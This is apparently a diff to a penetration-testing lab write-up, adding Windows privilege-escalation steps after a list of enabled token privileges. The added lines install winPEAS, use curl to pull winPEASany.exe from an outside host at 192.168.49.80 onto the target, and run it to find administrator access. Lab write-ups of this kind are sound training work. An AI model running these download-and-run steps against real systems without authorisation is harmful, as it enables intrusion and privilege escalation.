@@ -311,3 +311,19 @@ SeChangeNotifyPrivilege Bypass traverse checking Enabled
 SeUndockPrivilege Remove computer from docking station Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 SeTimeZonePrivilege Change the time zone Enabled
+
+# install winPEAS
+
+> apt install peass
+> ![](image_7.png)
+
+# moving winPEASany.exe
+
+> curl http://192.168.49.80/winPEASany.exe -o winPEASany.exe
+> ![](image_8.png)
+
+# execute winPEASEany.exe -> found Administrator
+
+> winPEASany.exe
+
+![](image_9.png)
